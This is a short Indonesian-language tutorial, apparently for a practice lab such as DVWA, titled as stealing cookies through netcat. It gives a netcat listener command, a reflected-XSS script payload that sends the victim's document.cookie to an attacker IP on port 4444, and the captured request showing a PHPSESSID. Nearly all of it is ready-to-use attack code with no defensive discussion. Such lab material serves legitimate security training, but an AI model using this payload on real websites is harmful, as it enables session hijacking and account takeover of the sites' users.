## mencuri cookie lewat netcat
## aktifin netcat dengan mengetik,
```bash
nc -lvnp 4444
```
## Di browser, di halaman XSS Reflected, masukkan payload:
```bash
<script>new Image().src='http://192.168.68.115:4444?c='+encodeURIComponent(document.cookie)</script>
```
Ganti dengan IP Kali 
## Submit.
Lihat terminal netcat. Seharusnya muncul request seperti:
GET /?c=PHPSESSID%3Dabc123%3B%20security%3Dlow HTTP/1.1
